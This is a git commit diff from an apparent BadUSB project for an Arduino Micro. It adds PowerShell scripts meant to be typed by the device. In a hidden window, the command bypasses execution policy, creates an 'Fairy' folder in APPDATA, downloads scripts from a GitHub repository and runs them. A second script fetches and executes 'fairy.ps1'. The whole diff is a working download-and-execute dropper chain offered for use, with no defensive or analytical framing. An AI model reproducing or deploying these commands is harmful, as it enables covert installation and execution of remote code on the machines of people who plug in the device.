8cad2a73c0ad4b3025353d13ca131e5d1d8b2573
h3xagon <62241425+h3xagon0001@users.noreply.github.com>
2025-06-28 18:56:02 +0800

    did the other files

--- deploy.ps1
+++ deploy.ps1
@@ -1,2 +1,5 @@
 # this command will be in the arduino
 powershell.exe -WindowStyle Hidden -Command {Set-ExecutionPolicy Bypass -Scope Process -Force; New-Item $env:APPDATA -Name \"Fairy\" -ItemType \"Directory\" -Force; Set-Location -Path \"$($env:APPDATA)\\Fairy\"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/download.ps1 -OutFile download.ps1; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/download.vbs -OutFile download.vbs; ./download.vbs; exit}
+
+# for debugging 
+powershell.exe -WindowStyle Hidden -Command {Set-ExecutionPolicy Bypass -Scope Process -Force; New-Item $env:APPDATA -Name "Fairy" -ItemType "Directory" -Force; Set-Location -Path "$($env:APPDATA)\Fairy"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/download.ps1 -OutFile download.ps1; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/download.vbs -OutFile download.vbs; ./download.vbs; exit}
--- run.ps1
+++ run.ps1
@@ -1,1 +1,3 @@
 # this script will download the latest version of fairy and run it
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/fairy.ps1 -OutFile fairy.ps1
+./fairy.ps1
